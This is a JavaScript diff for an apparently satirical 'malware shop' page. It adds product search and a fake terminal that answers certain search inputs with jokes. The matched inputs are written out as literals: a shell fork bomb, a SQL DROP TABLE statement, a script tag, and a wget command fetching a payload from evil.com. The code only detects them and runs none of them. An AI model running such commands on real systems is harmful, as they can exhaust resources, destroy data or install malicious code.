@@ -7,6 +7,14 @@ const progressLabel = document.getElementById('progressLabel');
 const confettiContainer = document.getElementById('confettiContainer');
 let reportInterval = null;
 
+const searchInput = document.getElementById('searchInput');
+const searchBtn = document.getElementById('searchBtn');
+const productCards = document.querySelectorAll('.product-card');
+const noResultsMessage = document.getElementById('noResultsMessage');
+const terminalOverlay = document.getElementById('terminalOverlay');
+const terminalOutput = document.getElementById('terminalOutput');
+const terminalClose = document.getElementById('terminalClose');
+
 function resetReportModal() {
   reportProgress.style.width = '0%';
   progressLabel.textContent = 'Preparing your malware...';
@@ -99,6 +107,104 @@ const cartItems = document.getElementById('cartItems');
 const cartTotal = document.getElementById('cartTotal');
 const checkoutBtn = document.getElementById('checkoutBtn');
 const buyButtons = document.querySelectorAll('.buy-button');
+
+function filterProducts() {
+  const query = searchInput.value.trim().toLowerCase();
+  let visibleCount = 0;
+
+  productCards.forEach((card) => {
+    const name = card.querySelector('h2').textContent.toLowerCase();
+    const description = card.querySelector('p').textContent.toLowerCase();
+    const features = card.querySelector('.feature-list')?.textContent.toLowerCase() ?? '';
+    const matches = query === '' || name.includes(query) || description.includes(query) || features.includes(query);
+
+    card.style.display = matches ? '' : 'none';
+    if (matches) visibleCount += 1;
+  });
+
+  noResultsMessage.classList.toggle('hidden', visibleCount > 0 || query === '');
+}
+
+function showTerminal(message, lines, charDelay = 24, lineDelay = 8) {
+  terminalOverlay.classList.remove('hidden');
+  terminalOutput.innerHTML = '<span class="terminal-warning">[!] MALICIOUS INPUT DETECTED</span>\n\n';
+
+  const typeText = (text, delay, done) => {
+    let index = 0;
+    const timer = setInterval(() => {
+      terminalOutput.innerHTML += text[index];
+      terminalOutput.scrollTop = terminalOutput.scrollHeight;
+      index += 1;
+
+      if (index >= text.length) {
+        clearInterval(timer);
+        done?.();
+      }
+    }, delay);
+  };
+
+  const typeNextLine = (lineIndex) => {
+    if (lineIndex >= lines.length) return;
+    const lineText = lines[lineIndex] + '\n';
+    typeText(lineText, lineDelay, () => typeNextLine(lineIndex + 1));
+  };
+
+  typeText(message + '\n\n', charDelay, () => {
+    if (!lines || lines.length === 0) return;
+    typeNextLine(0);
+  });
+}
+
+function hideTerminal() {
+  terminalOverlay.classList.add('hidden');
+  terminalOutput.innerHTML = '';
+}
+
+function handleSearch() {
+  const rawValue = searchInput.value.trim();
+
+  if (rawValue === '<script>') {
+    showTerminal('Intrusion detected. Deploying rubber ducky countermeasures…', ['> Intrusion detected. Deploying rubber ducky countermeasures…']);
+    return;
+  }
+
+  if (rawValue === ':(){ :|:& };:') {
+    const lines = Array.from({ length: 100 }, () => ':) :) :) :) :) :) :) :) :) :)');
+    showTerminal('Executing counter‑fork‑bomb… please stand by…', lines, 25);
+    return;
+  }
+
+  if (rawValue.toUpperCase() === 'DROP TABLE USERS;') {
+    showTerminal('Nice try, DBA.\nUnfortunately, our tables are glued to the floor.', []);
+    return;
+  }
+
+  if (rawValue.toUpperCase() === 'SELECT * FROM CREDIT_CARDS') {
+    showTerminal("Query failed: table 'credit_cards' does not exist.\nBut the FBI does.", []);
+    return;
+  }
+
+  if (rawValue.toLowerCase() === 'wget http://evil.com/payload.sh') {
+    showTerminal('Downloading malware...\nDownload blocked.\nWe only accept malware from trusted vendors.', []);
+    return;
+  }
+
+  filterProducts();
+}
+
+searchInput.addEventListener('input', filterProducts);
+searchBtn.addEventListener('click', handleSearch);
+searchInput.addEventListener('keydown', (event) => {
+  if (event.key === 'Enter') {
+    event.preventDefault();
+    handleSearch();
+  }
+});
+
+terminalClose.addEventListener('click', hideTerminal);
+terminalOverlay.addEventListener('click', (event) => {
+  if (event.target === terminalOverlay) hideTerminal();
+});
 
 // Open/close cart panel
 cartIcon.addEventListener('click', () => {
